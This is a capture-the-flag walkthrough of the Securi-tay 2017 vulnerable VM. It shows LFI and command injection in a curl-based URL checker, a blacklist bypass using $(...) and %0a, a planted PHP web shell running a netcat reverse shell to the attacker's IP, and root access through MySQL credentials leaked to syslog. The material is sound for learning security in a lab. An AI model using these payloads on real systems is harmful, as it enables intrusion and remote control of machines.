# Securi-tay 2017

This CTF can be found here: https://maze.pentest-challenge.co.uk/


Booting up the VM gives you the IP of the target: 

![](https://github.com/d-l-y/CTF-walkthroughs/blob/master/images/VirtualBox_securictf_29_04_2017_09_02_56.png)

An NMAP scan of all ports `nmap -p- 192.168.1.143` returns port 80 open, running and HTTP service.

Visiting this in a browser I am presented a page with some kind of "URL connectivity checker" which just returns the resource or the URL that is entered.

![](https://github.com/d-l-y/CTF-walkthroughs/blob/master/images/VirtualBox_Kali-Linux-2016.1-vbox-amd64_29_04_2017_09_05_20.png)

Looking at the output it is pretty clear the backend is using cUrl to return the requested URL. A couple things pop into my mind, maybe LFI or better yet RCE. 

Before poking at this I went ahead and started bruteforcing directories in the background:

![](https://github.com/d-l-y/CTF-walkthroughs/blob/master/images/VirtualBox_Kali-Linux-2016.1-vbox-amd64_29_04_2017_09_16_00.png)

Looking back at index.php I tried a few things the first being LFI.

![](https://github.com/d-l-y/CTF-walkthroughs/blob/master/images/VirtualBox_Kali-Linux-2016.1-vbox-amd64_29_04_2017_09_06_59.png)

Ok, cool so I can view files on the system maybe there is something interesting we can find, but before spending time looking for interesting files let me see if I can just acheive RCE and get a reverse shell.

I tried some different input that would allow me to append a command to the cUrl command that retreives the resource and it seemed there was some kind of black listing. This prevented me from using something straight forward like, `&` or `|`.

![](https://github.com/d-l-y/CTF-walkthroughs/blob/master/images/VirtualBox_Kali-Linux-2016.1-vbox-amd64_29_04_2017_09_08_09.png)

Since blacklisting is never a good way to go when preventing input there has to be a way to get a command to execute. Sure enough I found a few different ways to do this. 

I can use something like `$(whoami)` which will evaluate the command in the parenthesis before executing the curl command and return the output in the error.

![](https://github.com/d-l-y/CTF-walkthroughs/blob/master/images/VirtualBox_Kali-Linux-2016.1-vbox-amd64_29_04_2017_09_17_49.png)

Intercepting the POST request in Burpsuite I was able to insert a URL encoded newline charater `%0a` followed by any command which will execute the command.

I ended up figuring out that I can also just redirect the output of the cUrl command to a file. Looking back at the directory brute force I had started, there is a directory called `/uploads` which is likley writable by www-data.

I created a file on my attacker machine that contained some PHP to execute netcat on the target and connect back to my machine giving me a bash shell `<?php system('nc -c "/bin/bash" 192.168.1.139 444);?>`. Then started up a python simple http sever and requested this file using the interface of the target web app and redirected the output to a file in the uploads directory like so: `http://192.168.1.139:555/backdoor > ./uploads/backdoor.php`. The `>` is redirecting this output of the cUrl command which will be the PHP of the file I created on my attacker machine and putting it into a file called backdoor.php.

![](https://github.com/d-l-y/CTF-walkthroughs/blob/master/images/VirtualBox_Kali-Linux-2016.1-vbox-amd64_30_04_2017_09_45_20.png)

Check if the file successfully ended up in `/uploads`

![](https://github.com/d-l-y/CTF-walkthroughs/blob/master/images/VirtualBox_Kali-Linux-2016.1-vbox-amd64_30_04_2017_09_48_46.png)

Yup, ok now I have my reverse shell on the target machine I can startup netcat on my attacker machine and get a connection.

![](https://github.com/d-l-y/CTF-walkthroughs/blob/master/images/VirtualBox_Kali-Linux-2016.1-vbox-amd64_30_04_2017_09_53_28.png)

Spawn a proper shell.

![](https://github.com/d-l-y/CTF-walkthroughs/blob/master/images/VirtualBox_Kali-Linux-2016.1-vbox-amd64_30_04_2017_09_54_25.png)

Now that I have a shell on the target machine the first thing is to look around the environment. I started out looking for any interesting binaries or scripts that may have been created by a user that may perform interesting functions or have permissions set incorrectly. Listing the contents of the home directory for "ctfuser" revealed just that.

![](https://github.com/d-l-y/CTF-walkthroughs/blob/master/images/VirtualBox_Kali-Linux-2016.1-vbox-amd64_30_04_2017_11_33_39.png)

Look like mydbconnchecker is a binary that we have permission to execute. After running it the output shows that it is loging some information about the mysql database into syslog.

![](https://github.com/d-l-y/CTF-walkthroughs/blob/master/images/VirtualBox_Kali-Linux-2016.1-vbox-amd64_30_04_2017_11_35_02.png)

Reading syslog to see what is being logged shows that the username of `root` and with a password of `rorscahc` is being used to log into the `mysql` database on localhost `127.0.0.1`.

Taking a look at the proccesses running shows MySQL is running as root..not a good idea.

![](https://github.com/d-l-y/CTF-walkthroughs/blob/master/images/VirtualBox_Kali-Linux-2016.1-vbox-amd64_30_04_2017_11_42_33.png)

A quick google search showed me I can run shell commands from MySQL https://www.electrictoolbox.com/shell-commands-mysql-command-line-client/ . So now I have MySQL running as root, credentials to log into MySQL and a way to execute a shell command from MySQL. Lets try it out.

![](https://github.com/d-l-y/CTF-walkthroughs/blob/master/images/VirtualBox_Kali-Linux-2016.1-vbox-amd64_30_04_2017_11_44_26.png)

And there we go.. I can now read generate a flag from the `/root` directory.



